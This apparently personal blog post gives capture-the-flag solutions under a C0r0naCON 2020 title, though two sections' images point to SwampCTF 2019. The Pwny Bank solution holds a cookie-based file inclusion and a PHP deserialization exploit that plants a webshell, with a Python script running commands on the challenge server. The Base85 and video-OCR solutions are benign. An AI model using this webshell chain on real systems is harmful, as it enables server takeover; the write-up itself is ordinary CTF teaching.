---
layout: post
title: C0r0naCON 2020
---

## Pwny Bank [250]

### Problem Description

The latest launched application allows bank users to generate their passwords. It seems its administrator are too lazy to properly configure the password's manager, will you be able to find out the hidden functionality?

Mirrors:

http://157.230.107.175:8001
http://142.93.97.61:8001
http://134.122.93.176:8001/

Challenge created by Naivenom

### Solution

After connecting to the [website](http://142.93.97.61:8001/) of the challenge, we obtain the following page:

![_config.yml]({{ site.baseurl }}/images/2020-4-12-C0r0n4CON/pwnybank_1.png)

We observe a form with two fields, Username and PIN id. We tries several techniques, but we were not able to pass from this form. We observe the following directories through robots.txt

![_config.yml]({{ site.baseurl }}/images/2020-4-12-C0r0n4CON/pwnybank_2.png)

There are one file, "backup.txt", a two directories, "/tmp" and "/info". Also, I noticed that there is one cookie set as "user=pwnyBank".

The file "backup.txt" contained the following text:

"MOVED OUTSIDE WEBDIR FOR SECURITY REASONS"

I discovered that the "user" cookie was loading the file at "/info/pwnyBank.txt", because the same content of that file was being present in the main site.

We tried to change the "user=pwnyBank" cookie to "user=admin", and the content being in displayed in the main page changed. We can confirm that a LFI attack is possible.

The content of "backup.txt" indicated that the file was moved outside of the webdir. After changing the user cookie to "user=../../backup", we display the content of the main page, "index.php".

```
class SecurePasswordManager{
    function __construct() {
    }
    
   
    function __destruct() {
            $sid = session_id();
            mkdir("/app/public/tmp/{$sid}/");
            $filesize = file_put_contents("/app/public/tmp/{$sid}/{$this->filename}", $this->content);
            $filename = "/app/public/tmp/{$sid}/{$this->filename}";
            if ($filesize === 48){
                    echo "Administrator feauture: Uploaded user password file";
                    $password = file_get_contents($filename);
                    $content= base64_decode($password);
                    $file = fopen($filename, 'w');    
                    fwrite($file, $content);
                    fclose($file);
                    echo "[+] Debug: Done";
	    }
	    else {
	    unlink($filename);
	    }
    }
}

$data = unserialize($_GET['data']);
```

Analyzing the code, we can inject a PHP webshell using serialization.

We will send via a GET parameter, "data", a serialized object of the SecurePasswordManager class, applying the restriction of a content of 48 bytes. This way, the content will be published under "/<session_id>". We will use the following PHP script to serialize our data:

```
<?php
Class SecurePasswordManager{
    function __construct() {
    }
    
    function __destruct() {
    }
}

$obj = new SecurePasswordManager();
$obj->filename = "oreos.php";
$obj->content = "PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2MnXSk7ID8+    ";

$bar = [];
$bar[] = $obj;

$m = serialize($bar);
echo urlencode($m)."\n";
?>
```

```
# php -f serialize.php 
a%3A1%3A%7Bi%3A0%3BO%3A21%3A%22SecurePasswordManager%22%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A9%3A%22oreos.php%22%3Bs%3A7%3A%22content%22%3Bs%3A48%3A%22PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2MnXSk7ID8%2B++++%22%3B%7D%7D
```

Once we have the serialized data, we create a python script to automatize the procedure:

```
import requests
import sys

url = 'http://142.93.97.61:8001/'
r = requests.get(url)
cookies = r.cookies.get_dict()

serialized = 'a%3A1%3A%7Bi%3A0%3BO%3A21%3A%22SecurePasswordManager%22%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A9%3A%22oreos.php%22%3Bs%3A7%3A%22content%22%3Bs%3A48%3A%22PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2MnXSk7ID8%2B++++%22%3B%7D%7D'
r = requests.get(url+'?data='+serialized,cookies=cookies)
r = requests.get(url+"tmp/"+cookies['PHPSESSID']+'/oreos.php?c='+sys.argv[1],cookies=cookies)
print r.content
```

```
# python pwnybank.py "pwd"
/app/public/tmp/oqjdp6fdo7a2j4e6jj926uf3bc
# python pwnybank.py "ls /"
app
bin
bootstrap
dev
etc
flag.9f734b1948ae016cd9d01b0f12ffc8be6af2659e87372d78e1a5751d0a74fb2f95206e076c12bfbe8b41bed106f5b79787a329621ae9a1ebb8f056f878816a74
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
# python pwnybank.py "cat /flag*"
flag{????}

## NIT [128]

### Problem Description

The network investigative technique had just triggered and we were starting receive telemetry when, suddenly, a pop-up asked him for administrative access. He freaked out and yanked his cable leaving us with a copious amount of line noise. We've been tracking this guy for a while and really need a win here.

See if you can get anything out of this mess:

A7]^gF*(u(BkVO)1MV#U/oPWADf.4LBQ&)IE+j2TD.GLe2e4XS@q%-(3+b!&3+=g#AMcDXAMuMZ@:V/M2e4jY

-= Created by v0ldemort =-

- - - -

### Solution

We received a ciphered/encoded string, "A7]^gF*(u(BkVO)1MV#U/oPWADf.4LBQ&)IE+j2TD.GLe2e4XS@q%-(3+b!&3+=g#AMcDXAMuMZ@:V/M2e4jY". After trying to decipher it using many Cipher algorithms, I found the solution. It was encoded using [Base85](https://en.wikipedia.org/wiki/Ascii85):

I used [CyberChef](https://gchq.github.io/CyberChef) to decode the string obtaining an onion link _depastedihrn3jtw.onion/show.php?md5=7d1ecb0f8f428b70e49de68ead337d7e_:

![_config.yml]({{ site.baseurl }}/images/2019-4-8-SwampCTF2019/swampctf2019_img2.png)

This link shows the following information in the comments:

![_config.yml]({{ site.baseurl }}/images/2019-4-8-SwampCTF2019/swampctf2019_img3.jpg)

The comment with "flag = fecabed47e50e3a2b615e86d0e0f1c59" suggested me to visit the following onion link _depastedihrn3jtw.onion/show.php?md5=fecabed47e50e3a2b615e86d0e0f1c59_, which finally shows the flag:

![_config.yml]({{ site.baseurl }}/images/2019-4-8-SwampCTF2019/swampctf2019_img4.jpg)

Flag: **flag{sp00ky_W3bz_L0L}**

## Ghidra Release [310]

### Problem Description

[Meanwhile at the NSA on a Friday afternoon]

Manager: Hey, we're going to be releasing our internal video training for Ghidra and we need you to watch it all to flag any content that needs to be redacted before release.

Manager: The release is next Monday. Hope you didn't have any weekend plans!

You: Uhhh, sure bu-

Manager: Great! Thanks. Make sure nothing gets out.

You: ... [looks at clock. It reads 3:45PM]

You: [Mutters to self] No way am I watching all of this: https://static.swampctf.com/ghidra_nsa_training.mp4

-= Created by DigitalCold =-

- - - -

### Solution

I downloaded the video from the provided [link](https://static.swampctf.com/ghidra_nsa_training.mp4).

After having it downloaded, I extracted 1 frame for each second of video using the [ffmpeg](https://ffmpeg.org/ffmpeg.html) tool.

```
$ ffmpeg -i ghidra_nsa_training.mp4 -vf "fps=1" out%0d.png
```

Once having all the frames extracted, I used [tesseract](https://es.wikipedia.org/wiki/Tesseract_OCR), an OCR engine to extract text from images to analyze all the frames previously extracted. The simple bash script I prepare for that:

```
for file in $(ls . | grep png); do
	echo "image:${file}";
	tesseract $file - | grep -i flag
done
```

I obtained the first part of the flag in the image out12175.png, as shown in the following image:

![_config.yml]({{ site.baseurl }}/images/2019-4-8-SwampCTF2019/swampctf2019_img5.jpg)

The next part of the flag was obtained in the image out26715.png:

![_config.yml]({{ site.baseurl }}/images/2019-4-8-SwampCTF2019/swampctf2019_img6.jpg)

All the parts of the flag were:

* FLAG(1/4): flag{l34
* FLAG(2/4): kfr33_n4
* FLAG(3/4): tion4l_s
* FLAG(4/4): 3cur1ty}

Flag: **flag{l34kfr33_n4tion4l_s3cur1ty}**
